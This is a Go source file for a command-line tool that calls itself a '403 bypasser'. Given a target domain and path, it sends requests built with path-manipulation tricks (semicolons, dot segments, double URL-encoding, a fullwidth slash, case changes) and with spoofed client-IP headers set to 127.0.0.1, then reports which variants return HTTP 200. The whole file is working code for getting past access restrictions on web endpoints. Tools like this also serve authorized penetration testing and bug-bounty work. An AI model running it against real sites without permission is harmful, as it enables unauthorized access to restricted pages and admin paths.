package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
)

var Red = "\033[31m"
var Green = "\033[32m"
var White = "\033[97m"

func main() {
	domain := flag.String("url", "", "A domain with the protocol. Example: https://daffa.tech")
	path := flag.String("path", "", "An endpoint. Example: admin")
	flag.Parse()

	if *domain == "" || *path == "" {
		log.Fatalln("Using flag -url and -path")
		os.Exit(0)
	}

	upperCase := strings.ToUpper(*path)

	endpoint := []string{
		*domain + "/" + upperCase,
		*domain + "/" + *path + "/",
		*domain + "/" + *path + "/.",
		*domain + "//" + *path + "//",
		*domain + "/./" + *path + "/./",
		*domain + "/./" + *path + "/..",
		*domain + "/;/" + *path,
		*domain + "/.;/" + *path,
		*domain + "//;//" + *path,
		*domain + "/" + *path + "..;/",
		*domain + "/%2e/" + *path,
		*domain + "/%252e/" + *path,
		*domain + "/%ef%bc%8f" + *path}

	headers := []string{
		"X-Custom-IP-Authorization",
		"X-Originating-IP",
		"X-Forwarded-For",
		"X-Remote-IP",
		"X-Client-IP",
		"X-Host",
		"X-Forwarded-Host",
		"X-ProxyUser-Ip",
		"X-Remote-Addr"}

	fmt.Println(Green, " _  _    ___ ____        ____                                      				")
	fmt.Println(Green, "| || |  / _ \\___ \\      |  _ \\                                     			")
	fmt.Println(Green, "| || |_| | | |__) |_____| |_) |_   _ _ __   __ _ ___ ___  ___ _ __ 				")
	fmt.Println(Green, "|__   _| | | |__ <______|  _ <| | | | '_ \\ / _` / __/ __|/ _ \\ '__|			")
	fmt.Println(Green, "   | | | |_| |__) |     | |_) | |_| | |_) | (_| \\__ \\__ \\  __/ |   			")
	fmt.Println(Green, "   |_|  \\___/____/      |____/ \\__, | .__/ \\__,_|___/___/\\___|_|   			")
	fmt.Println(Green, "                                __/ | |                            				")
	fmt.Println(Green, "                               |___/|_|                          v1.0.2", White)

	fmt.Println("\nDomain:", *domain)
	fmt.Println("Path:", *path)

	fmt.Println("\nNormal Request")
	for i, str := range endpoint {
		req, err := http.Get(str)
		if err != nil {
			log.Fatal(err)
		}
		output := fmt.Sprintf("%s %d %s", str, req.StatusCode, http.StatusText(req.StatusCode))
		if req.StatusCode == 200 {
			fmt.Println(Green, i+1, output, White)
		} else {
			fmt.Println(Red, i+1, output, White)
		}

	}

	fmt.Println("\nRequest with Headers")
	for j, head := range headers {
		req2, err := http.NewRequest("GET", *domain+"/"+*path, nil)
		if err != nil {
			log.Fatal(err)
		}
		req2.Header.Set(head, "127.0.0.1")
		resp, err := http.DefaultClient.Do(req2)
		if err != nil {
			log.Fatal(err)
		}
		output2 := fmt.Sprintf("%s %s %d %s", head, *domain+"/"+*path, resp.StatusCode, http.StatusText(resp.StatusCode))

		if resp.StatusCode == 200 {
			fmt.Println(Green, j+1, output2, White)
		} else {
			fmt.Println(Red, j+1, output2, White)
		}
	}
}
